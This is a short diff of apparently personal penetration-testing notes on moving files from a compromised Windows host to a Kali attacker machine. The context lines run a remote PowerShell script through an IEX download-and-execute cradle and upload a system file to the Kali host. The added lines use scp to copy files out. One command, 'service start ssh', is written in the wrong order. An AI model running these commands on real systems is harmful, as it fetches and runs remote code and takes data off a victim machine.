@@ -12,3 +12,15 @@ Option2) PowerShell Web Uploads :- We can run the upload server in kali to get f
     Step 2) IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') :- Download the pwershell program to be used for transfer
     Step 3) Invoke-FileUpload -Uri http://<Kali IP address:Port>/upload -File <File path e.g. C:\Windows\System32\drivers\etc\hosts>
       
+=============
+
+Below one is tested and working 
+
+Step 1) Start the SSH service on Kali 
+    service start ssh 
+
+Step 2) From the windows server we can run the below command format to transfer the file. 
+    scp <File Name> root@<Kali IP address>:/<Destination path of the file>
+
+Step 3) Once the transfer is done, stop the SSH service 
+    service ssh stop
